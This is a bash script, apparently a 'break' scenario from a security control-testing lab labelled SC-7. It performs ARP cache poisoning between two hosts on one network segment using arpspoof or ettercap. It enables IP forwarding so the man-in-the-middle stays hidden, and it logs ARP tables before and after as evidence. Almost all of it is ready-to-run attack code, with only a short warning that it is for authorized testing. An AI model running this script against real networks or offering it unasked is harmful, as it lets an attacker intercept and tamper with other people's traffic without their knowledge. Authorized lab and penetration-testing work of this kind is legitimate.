#!/usr/bin/env bash
set -euo pipefail

# SC-7 ARP Spoofing — Break
#
# Performs ARP cache poisoning between two hosts on the same network segment.
# The attacker convinces both hosts that the attacker's MAC address is the other host's MAC,
# causing all traffic between them to route through the attacker (man-in-the-middle).
#
# REQUIREMENTS:
#   - arpspoof (part of dsniff package) OR ettercap
#   - Root/sudo privileges
#   - Attacker must be on the same L2 segment as both targets
#   - IP forwarding must be enabled to maintain connectivity (stealth)
#
# USAGE:
#   sudo ./break.sh <interface> <target1_ip> <target2_ip>
#
# EXAMPLE:
#   sudo ./break.sh eth0 192.168.1.1 192.168.1.100
#   (Poisons ARP between the gateway and a workstation)
#
# WARNING: This script is for authorized security testing only.
#          Unauthorized use is illegal under the CFAA and equivalent laws.

# --- Argument Validation ---

if [[ $# -ne 3 ]]; then
    echo "Usage: $0 <interface> <target1_ip> <target2_ip>"
    echo "Example: $0 eth0 192.168.1.1 192.168.1.100"
    exit 1
fi

IFACE="$1"
TARGET1="$2"
TARGET2="$3"

# Verify running as root
if [[ $EUID -ne 0 ]]; then
    echo "[ERROR] This script must be run as root (sudo)."
    exit 1
fi

# Verify interface exists
if ! ip link show "$IFACE" &>/dev/null; then
    echo "[ERROR] Interface $IFACE does not exist."
    echo "Available interfaces:"
    ip -br link show
    exit 1
fi

# --- Pre-Attack State ---

echo "============================================"
echo "SC-7 ARP Spoofing — Break Scenario"
echo "============================================"
echo ""
echo "[*] Interface:  $IFACE"
echo "[*] Target 1:   $TARGET1"
echo "[*] Target 2:   $TARGET2"
echo "[*] Attacker:   $(ip -4 addr show "$IFACE" | grep -oP 'inet \K[\d.]+')"
echo ""

# Record pre-attack ARP tables for evidence
echo "[*] Pre-attack ARP table (for evidence comparison):"
echo "--- ARP table snapshot ---"
arp -n | grep -E "$TARGET1|$TARGET2" || echo "(no existing entries)"
echo ""

# --- Enable IP Forwarding ---
# Without this, traffic dies at the attacker and the attack is detected immediately
# because connectivity breaks between the two targets.

echo "[*] Enabling IP forwarding (stealth mode)..."
ORIG_FORWARD=$(cat /proc/sys/net/ipv4/ip_forward)
echo 1 > /proc/sys/net/ipv4/ip_forward
echo "[+] IP forwarding enabled (was: $ORIG_FORWARD)"
echo ""

# --- Cleanup Handler ---
# Restore IP forwarding on exit and notify

cleanup() {
    echo ""
    echo "[*] Cleaning up..."
    echo "$ORIG_FORWARD" > /proc/sys/net/ipv4/ip_forward
    echo "[+] IP forwarding restored to: $ORIG_FORWARD"
    echo "[+] ARP tables on targets will self-heal in 1-5 minutes (ARP cache timeout)"
    echo ""
    echo "[*] Post-attack ARP table:"
    arp -n | grep -E "$TARGET1|$TARGET2" || echo "(no entries)"
}

trap cleanup EXIT

# --- Select Attack Tool ---

if command -v arpspoof &>/dev/null; then
    TOOL="arpspoof"
elif command -v ettercap &>/dev/null; then
    TOOL="ettercap"
else
    echo "[ERROR] Neither arpspoof (dsniff) nor ettercap is installed."
    echo "Install with:"
    echo "  apt-get install dsniff    # for arpspoof"
    echo "  apt-get install ettercap  # for ettercap"
    exit 1
fi

echo "[*] Using tool: $TOOL"
echo ""

# --- Execute ARP Poisoning ---

if [[ "$TOOL" == "arpspoof" ]]; then
    echo "[*] Starting ARP poisoning..."
    echo "[*] Telling $TARGET1 that $TARGET2 is at our MAC"
    echo "[*] Telling $TARGET2 that $TARGET1 is at our MAC"
    echo ""
    echo "[!] Attack running. Press Ctrl+C to stop."
    echo ""

    # Run both directions in background
    # arpspoof sends gratuitous ARP replies to poison the target's cache
    arpspoof -i "$IFACE" -t "$TARGET1" "$TARGET2" &
    PID1=$!
    arpspoof -i "$IFACE" -t "$TARGET2" "$TARGET1" &
    PID2=$!

    # Wait for user to stop
    wait "$PID1" "$PID2" 2>/dev/null || true

elif [[ "$TOOL" == "ettercap" ]]; then
    echo "[*] Starting ARP poisoning with ettercap..."
    echo "[*] Full-duplex MITM between $TARGET1 and $TARGET2"
    echo ""
    echo "[!] Attack running. Press 'q' to stop."
    echo ""

    # Ettercap unified mode, text-only, ARP poisoning both directions
    ettercap -T -q -i "$IFACE" -M arp:remote "/$TARGET1//" "/$TARGET2//"
fi
